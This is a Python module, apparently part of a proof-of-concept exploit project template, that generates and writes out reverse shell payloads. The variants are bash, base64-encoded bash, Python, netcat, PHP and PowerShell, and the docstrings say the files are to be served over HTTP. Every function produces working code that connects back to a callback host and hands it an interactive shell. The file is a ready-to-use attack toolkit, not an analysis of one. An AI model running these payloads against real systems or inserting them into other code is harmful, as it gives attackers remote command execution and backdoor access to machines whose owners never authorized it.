"""
Reverse shell generation utilities for POCs.
Quick and dirty shell generation for common scenarios.
"""

from pathlib import Path
from {{cookiecutter.project_slug}}.utils.paths import PAYLOADS_DIR
from {{cookiecutter.project_slug}}.utils.output import out


def _write_shell(content, shell_type, ext="sh"):
    """Helper to write shell content to payloads/shells/"""
    filename = f"rev_{shell_type}.{ext}"

    shells_dir = PAYLOADS_DIR / "shells"
    shells_dir.mkdir(exist_ok=True)

    shell_path = shells_dir / filename
    shell_path.write_text(content)
    shell_path.chmod(0o755)
    out.info(f"{shell_type} reverse shell written to {shell_path}")

    return f"shells/{filename}"


def bash_shell(callback_host, callback_port=4444):
    """Generate a basic bash reverse shell.

    :Creates: ``payloads/shells/rev_bash.sh``
    :Access via: ``http://your-server:8000/shells/rev_bash.sh``
    :Returns: ``shells/rev_bash.sh`` (relative path)
    """
    content = f"""#!/bin/bash
bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1
"""
    return _write_shell(content, "bash", "sh")


def bash_encoded_shell(callback_host, callback_port=4444):
    """Generate a base64-encoded bash reverse shell.

    :Creates: ``payloads/shells/rev_bash_b64.sh``
    :Access via: ``http://your-server:8000/shells/rev_bash_b64.sh``
    :Returns: ``shells/rev_bash_b64.sh`` (relative path)
    """
    import base64
    cmd = f"bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1"
    encoded = base64.b64encode(cmd.encode()).decode()
    content = f"""#!/bin/bash
echo "{encoded}" | base64 -d | bash
"""
    return _write_shell(content, "bash_b64", "sh")


def python_shell(callback_host, callback_port=4444):
    """Generate a Python reverse shell.

    :Creates: ``payloads/shells/rev_python.py``
    :Access via: ``http://your-server:8000/shells/rev_python.py``
    :Returns: ``shells/rev_python.py`` (relative path)
    """
    content = f"""#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{callback_host}",{callback_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    return _write_shell(content, "python", "py")


def python_oneliner(callback_host, callback_port=4444):
    """Return a Python reverse shell one-liner (not written to file).

    :Creates: Nothing (returns command string only)
    :Returns: Python one-liner command string for direct execution
    """
    return f"""python -c 'import socket,os,pty;s=socket.socket();s.connect(("{callback_host}",{callback_port}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/sh")'"""


def nc_shell(callback_host, callback_port=4444):
    """Generate a netcat reverse shell.

    :Creates: ``payloads/shells/rev_nc.sh``
    :Access via: ``http://your-server:8000/shells/rev_nc.sh``
    :Returns: ``shells/rev_nc.sh`` (relative path)
    """
    content = f"""#!/bin/sh
nc -e /bin/sh {callback_host} {callback_port}
"""
    return _write_shell(content, "nc", "sh")


def nc_mkfifo_shell(callback_host, callback_port=4444):
    """Generate a netcat reverse shell using mkfifo (for nc without -e).

    :Creates: ``payloads/shells/rev_nc_mkfifo.sh``
    :Access via: ``http://your-server:8000/shells/rev_nc_mkfifo.sh``
    :Returns: ``shells/rev_nc_mkfifo.sh`` (relative path)
    """
    content = f"""#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {callback_host} {callback_port} >/tmp/f
"""
    return _write_shell(content, "nc_mkfifo", "sh")


def php_shell(callback_host, callback_port=4444):
    """Generate a PHP reverse shell.

    :Creates: ``payloads/shells/rev_php.php``
    :Access via: ``http://your-server:8000/shells/rev_php.php``
    :Returns: ``shells/rev_php.php`` (relative path)
    """
    content = f"""<?php
$sock=fsockopen("{callback_host}",{callback_port});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
    return _write_shell(content, "php", "php")


def powershell_shell(callback_host, callback_port=4444):
    """Generate a PowerShell reverse shell.

    :Creates: ``payloads/shells/rev_powershell.ps1``
    :Access via: ``http://your-server:8000/shells/rev_powershell.ps1``
    :Returns: ``shells/rev_powershell.ps1`` (relative path)
    """
    # Using .replace() to avoid Jinja2/cookiecutter template syntax conflicts with PowerShell's curly braces
    content = f"""$client = New-Object System.Net.Sockets.TCPClient("{callback_host}",{callback_port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%<<<0>>>
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<<<
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
>>>
$client.Close()""".replace('<<<', '{').replace('>>>', '}')
    return _write_shell(content, "powershell", "ps1")


def powershell_oneliner(callback_host, callback_port=4444):
    """Return a PowerShell reverse shell one-liner (not written to file).

    :Creates: Nothing (returns command string only)
    :Returns: PowerShell one-liner command string for direct execution
    """
    # Using .replace() to avoid Jinja2/cookiecutter template syntax conflicts with PowerShell's curly braces
    return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{callback_host}',{callback_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%<<<0>>>;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<<<;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()>>>;$client.Close()" """.replace('<<<', '{').replace('>>>', '}')
